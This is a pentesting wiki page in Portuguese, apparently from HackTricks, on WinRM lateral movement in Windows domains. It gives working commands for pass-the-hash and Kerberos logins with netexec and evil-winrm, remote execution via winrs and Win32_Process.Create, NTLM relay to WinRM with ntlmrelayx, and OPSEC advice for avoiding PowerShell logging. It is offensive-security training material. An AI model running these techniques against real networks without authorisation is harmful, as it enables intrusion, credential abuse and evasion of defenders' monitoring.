# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM é um dos transportes de **lateral movement** mais convenientes em ambientes Windows porque fornece uma shell remota sobre **WS-Man/HTTP(S)** sem precisar de truques de criação de serviço via SMB. Se o alvo expõe **5985/5986** e seu principal tem permissão para usar remoting, muitas vezes você pode passar de "valid creds" para "interactive shell" muito rapidamente.

Para a **enumeração de protocolo/serviço**, listeners, habilitar WinRM, `Invoke-Command` e uso genérico do client, veja:

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Por que operadores gostam de WinRM

- Usa **HTTP/HTTPS** em vez de SMB/RPC, então muitas vezes funciona onde execução no estilo PsExec é bloqueada.
- Com **Kerberos**, evita enviar credenciais reutilizáveis ao alvo.
- Funciona bem com tooling de **Windows**, **Linux** e **Python** (`winrs`, `evil-winrm`, `pypsrp`, `netexec`).
- O caminho interativo de PowerShell remoting inicia **`wsmprovhost.exe`** no alvo sob o contexto do usuário autenticado, o que é operacionalmente diferente de execução baseada em serviço.

## Modelo de acesso e pré-requisitos

Na prática, um lateral movement bem-sucedido via WinRM depende de **três** coisas:

1. O alvo tem um **WinRM listener** (`5985`/`5986`) e regras de firewall que permitem acesso.
2. A conta consegue **autenticar** no endpoint.
3. A conta tem permissão para **abrir uma sessão de remoting**.

Formas comuns de obter esse acesso:

- **Local Administrator** no alvo.
- Associação ao grupo **Remote Management Users** em sistemas mais novos ou **WinRMRemoteWMIUsers__** em sistemas/componentes que ainda respeitam esse grupo.
- Direitos explícitos de remoting delegados por meio de security descriptors locais / alterações de ACL de PowerShell remoting.

Se você já controla uma máquina com privilégios de admin, lembre-se de que também pode **delegar acesso a WinRM sem associação completa ao grupo admin** usando as técnicas descritas aqui:

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Pegadinhas de autenticação que importam durante o lateral movement

- **Kerberos requer hostname/FQDN**. Se você conectar por IP, o client geralmente faz fallback para **NTLM/Negotiate**.
- Em casos de borda de **workgroup** ou cross-trust, NTLM normalmente requer **HTTPS** ou que o alvo seja adicionado a **TrustedHosts** no client.
- Com **local accounts** via Negotiate em um workgroup, as restrições de UAC remote podem impedir o acesso, a menos que a conta integrada Administrator seja usada ou `LocalAccountTokenFilterPolicy=1`.
- PowerShell remoting usa por padrão o SPN **`HTTP/<host>`**. Em ambientes onde **`HTTP/<host>`** já está registrado para outra service account, o Kerberos do WinRM pode falhar com `0x80090322`; use um SPN com porta ou mude para **`WSMAN/<host>`** onde esse SPN existir.

Se você conseguir credenciais válidas durante password spraying, validá-las via WinRM costuma ser a forma mais rápida de verificar se elas viram uma shell:

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Lateral movement de Linux para Windows

### NetExec / CrackMapExec para validação e execução em uma única ação
```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```
### Evil-WinRM para shells interativas

`evil-winrm` continua sendo a opção interativa mais conveniente a partir do Linux porque suporta **passwords**, **NT hashes**, **Kerberos tickets**, **client certificates**, transferência de arquivos e carregamento em memória de PowerShell/.NET.
```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```
### Caso limite de Kerberos SPN: `HTTP` vs `WSMAN`

Quando o SPN padrão **`HTTP/<host>`** causa falhas no Kerberos, tente solicitar/usAR um ticket **`WSMAN/<host>`** em vez disso. Isso aparece em configurações corporativas endurecidas ou incomuns, onde `HTTP/<host>` já está associado a outra conta de serviço.
```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```
Isso também é útil após abuso de **RBCD / S4U** quando você forjou ou solicitou especificamente um ticket de serviço **WSMAN** em vez de um ticket genérico `HTTP`.

### Certificate-based authentication

O WinRM também suporta **client certificate authentication**, mas o certificado deve estar mapeado no alvo para uma **local account**. Do ponto de vista ofensivo, isso importa quando:

- você já roubou/exportou um certificado de cliente válido e a chave privada já mapeados para WinRM;
- você abusou de **AD CS / Pass-the-Certificate** para obter um certificado para um principal e então fazer pivot para outro caminho de autenticação;
- você está operando em ambientes que evitam deliberadamente remoting baseado em senha.
```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```
Client-certificate WinRM é muito menos comum do que autenticação por password/hash/Kerberos, mas, quando existe, pode fornecer um caminho de **lateral movement sem password** que sobrevive à rotação de passwords.

### Python / automation with `pypsrp`

Se você precisar de automação em vez de um operator shell, `pypsrp` oferece WinRM/PSRP a partir de Python com suporte a **NTLM**, **certificate auth**, **Kerberos** e **CredSSP**.
```python
from pypsrp.client import Client

client = Client(
"srv01.domain.local",
username="DOMAIN\\user",
password="Password123!",
ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```
## Movimento lateral WinRM nativo do Windows

### `winrs.exe`

`winrs.exe` vem integrado e é útil quando você quer **execução nativa de comandos via WinRM** sem abrir uma sessão interativa de remoting do PowerShell:
```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```
Operacionalmente, `winrs.exe` comumente resulta em uma cadeia de processos remotos semelhante a:
```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```
Isso vale a pena lembrar porque é diferente de exec baseada em serviço e de sessões interativas PSRP.

### `winrm.cmd` / WS-Man COM em vez de PowerShell remoting

Você também pode executar via **WinRM transport** sem `Enter-PSSession` invocando classes WMI sobre WS-Man. Isso mantém o transport como WinRM enquanto o primitive de execução remota passa a ser **WMI `Win32_Process.Create`**:
```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```
Essa abordagem é útil quando:

- O logging do PowerShell é fortemente monitorado.
- Você quer **WinRM transport** mas não um workflow clássico de PS remoting.
- Você está criando ou usando tooling customizada em torno do objeto COM **`WSMan.Automation`**.

## NTLM relay para WinRM (WS-Man)

Quando o relay de SMB é bloqueado por signing e o relay de LDAP é restrito, **WS-Man/WinRM** ainda pode ser um alvo de relay atraente. O `ntlmrelayx.py` moderno inclui **WinRM relay servers** e pode fazer relay para alvos **`wsman://`** ou **`winrms://`**.
```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```
Dois pontos práticos:

- Relay é mais útil quando o alvo aceita **NTLM** e o principal relayed tem permissão para usar WinRM.
- O código recente do Impacket trata especificamente requisições **`WSMANIDENTIFY: unauthenticated`** para que probes no estilo `Test-WSMan` não quebrem o fluxo do relay.

Para restrições de multi-hop após obter uma primeira sessão WinRM, veja:

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## Notas de OPSEC e detecção

- **PowerShell remoting interativo** normalmente cria **`wsmprovhost.exe`** no alvo.
- **`winrs.exe`** comumente cria **`winrshost.exe`** e depois o processo filho solicitado.
- Espere telemetria de **network logon**, eventos do serviço WinRM e logging operacional/de script-block do PowerShell se você usar PSRP em vez de `cmd.exe` bruto.
- Se você só precisar de um único comando, `winrs.exe` ou execução WinRM de uso único pode ser mais silenciosa do que uma sessão interativa de remoting de longa duração.
- Se Kerberos estiver disponível, prefira **FQDN + Kerberos** em vez de IP + NTLM para reduzir tanto problemas de trust quanto mudanças incômodas de `TrustedHosts` no lado do cliente.

## Referências

- [Evil-WinRM README](https://github.com/Hackplayers/evil-winrm)
- [Microsoft: Error `0x80090322` when connecting PowerShell to a remote server via WinRM](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)

{{#include ../../banners/hacktricks-training.md}}
